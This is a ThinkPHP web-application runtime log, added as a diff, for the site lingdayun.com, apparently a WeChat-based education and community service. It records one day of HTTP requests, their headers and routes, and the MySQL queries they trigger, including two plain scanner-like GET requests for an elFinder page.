+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000820s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.002986s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000390s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T15:49:48+08:00 ] 10.0.8.4 221.15.252.180 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.140481s][吞吐率：7.12req/s] [内存消耗：1,916.56kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 12; 22041211AC Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/1419 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000881s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003224s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000482s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T15:50:35+08:00 ] 10.0.8.4 221.15.252.180 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.123243s][吞吐率：8.11req/s] [内存消耗：1,916.79kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 12; 22041211AC Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/1419 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000967s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003863s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000569s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T16:25:14+08:00 ] 10.0.8.4 117.132.183.17 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.079165s][吞吐率：12.63req/s] [内存消耗：1,276.41kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => '',
+  'connection' => 'close',
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'host' => 'www.lingdayun.com',
+  'pragma' => 'no-cache',
+  'cache-control' => 'no-cache',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T17:02:03+08:00 ] 10.0.8.4 51.222.253.4 GET /
+[ log ] lingdayun.com/ [运行时间：0.084163s][吞吐率：11.88req/s] [内存消耗：1,275.89kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'deflate, gzip, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T19:27:28+08:00 ] 10.0.8.4 114.111.30.116 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.077291s][吞吐率：12.94req/s] [内存消耗：1,277.05kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-US',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T19:31:44+08:00 ] 10.0.8.4 114.111.30.116 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.094729s][吞吐率：10.56req/s] [内存消耗：1,277.05kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-US',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T20:42:07+08:00 ] 10.0.8.4 183.199.186.96 GET /index.php/index/api/video_tuijian
+[ log ] www.lingdayun.com/index.php/index/api/video_tuijian [运行时间：0.144171s][吞吐率：6.94req/s] [内存消耗：1,909.73kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'video_tuijian',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; PPA-AL20 Build/HUAWEIPPA-AL20; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4367 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/2501 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->video_tuijian[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000875s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_video` [ RunTime:0.003464s ]
+[ sql ] [ SQL ] SELECT `a`.*,`d`.`teacher_name`,`b`.`kemu_cate`,`c`.`nianji_cate` FROM `ld_video` `a` INNER JOIN `ld_teacher` `d` ON `a`.`teacher_id`=`d`.`id` INNER JOIN `ld_kemu_cate` `b` ON `a`.`video_kemu`=`b`.`id` INNER JOIN `ld_nianji_cate` `c` ON `a`.`video_nianji`=`c`.`id` ORDER BY id desc LIMIT 3 [ RunTime:0.001272s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T20:42:07+08:00 ] 10.0.8.4 183.199.186.96 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.153795s][吞吐率：6.50req/s] [内存消耗：1,916.80kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; PPA-AL20 Build/HUAWEIPPA-AL20; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4367 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/2501 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000781s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003859s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000399s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T20:50:46+08:00 ] 10.0.8.4 180.101.244.13 GET /index.php/index/api/video_tuijian
+[ log ] www.lingdayun.com/index.php/index/api/video_tuijian [运行时间：0.117967s][吞吐率：8.48req/s] [内存消耗：1,909.83kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'video_tuijian',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'referer' => 'http://www.lingdayun.com/html/index.html',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; PPA-AL20 Build/HUAWEIPPA-AL20; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4367 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/2501 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->video_tuijian[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003925s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_video` [ RunTime:0.002748s ]
+[ sql ] [ SQL ] SELECT `a`.*,`d`.`teacher_name`,`b`.`kemu_cate`,`c`.`nianji_cate` FROM `ld_video` `a` INNER JOIN `ld_teacher` `d` ON `a`.`teacher_id`=`d`.`id` INNER JOIN `ld_kemu_cate` `b` ON `a`.`video_kemu`=`b`.`id` INNER JOIN `ld_nianji_cate` `c` ON `a`.`video_nianji`=`c`.`id` ORDER BY id desc LIMIT 3 [ RunTime:0.000507s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T20:50:46+08:00 ] 10.0.8.4 194.38.20.161 GET /elfinder/elfinder.html
+[ log ] lingdayun.com/elfinder/elfinder.html [运行时间：0.073072s][吞吐率：13.69req/s] [内存消耗：1,112.46kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'elfinder',
+    1 => 'elfinder',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'content-length' => '0',
+  'content-type' => 'application/json',
+  'host' => 'lingdayun.com',
+  'user-agent' => 'ALittle Client',
+  'accept' => '*/*',
+)
+[ info ] [ PARAM ] array (
+  '/elfinder/elfinder_html' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:00:46+08:00 ] 10.0.8.4 180.101.244.13 GET /elfinder/elfinder.html
+[ log ] lingdayun.com/elfinder/elfinder.html [运行时间：0.075073s][吞吐率：13.32req/s] [内存消耗：1,113.15kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'elfinder',
+    1 => 'elfinder',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'ALittle Client',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/elfinder/elfinder_html' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:11:36+08:00 ] 10.0.8.4 101.23.151.21 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.115947s][吞吐率：8.62req/s] [内存消耗：1,916.83kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=jfs161jjr7rmqrji8etj2510s4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000738s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003090s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000360s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T21:11:39+08:00 ] 10.0.8.4 101.23.151.21 GET /static/js/layer/layer.js
+[ log ] www.lingdayun.com/static/js/layer/layer.js [运行时间：0.079557s][吞吐率：12.57req/s] [内存消耗：1,113.90kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'js',
+    2 => 'layer',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=jfs161jjr7rmqrji8etj2510s4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_wode.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/static/js/layer/layer_js' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:11:40+08:00 ] 10.0.8.4 101.23.151.21 GET /index.php/api/base/check_login
+[ log ] www.lingdayun.com/index.php/api/base/check_login [运行时间：0.084038s][吞吐率：11.90req/s] [内存消耗：1,335.55kb] [文件加载：45]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'base',
+    2 => 'check_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=jfs161jjr7rmqrji8etj2510s4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_wode.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\api\controller\Base->check_login[ C:\wwwroot\www.lingdayun.com\application\api\controller\Base.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T21:11:42+08:00 ] 10.0.8.4 101.23.151.21 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.112053s][吞吐率：8.92req/s] [内存消耗：1,916.83kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=jfs161jjr7rmqrji8etj2510s4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003917s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003620s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000421s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T21:11:44+08:00 ] 10.0.8.4 101.23.151.21 GET /index.php/api/base/find_car
+[ log ] www.lingdayun.com/index.php/api/base/find_car [运行时间：0.125929s][吞吐率：7.94req/s] [内存消耗：1,901.27kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'base',
+    2 => 'find_car',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=jfs161jjr7rmqrji8etj2510s4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_car.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\api\controller\Base->find_car[ C:\wwwroot\www.lingdayun.com\application\api\controller\Base.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000722s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_driver` [ RunTime:0.003227s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_driver` WHERE  (  status=1 ) [ RunTime:0.000352s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T21:11:44+08:00 ] 10.0.8.4 101.23.151.21 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.149461s][吞吐率：6.69req/s] [内存消耗：1,916.83kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=jfs161jjr7rmqrji8etj2510s4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_car.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; JER-AN10 Build/HUAWEIJER-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20221012 Mobile Safari/537.36 MMWEBID/7980 MicroMessenger/8.0.30.2260(0x28001E55) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
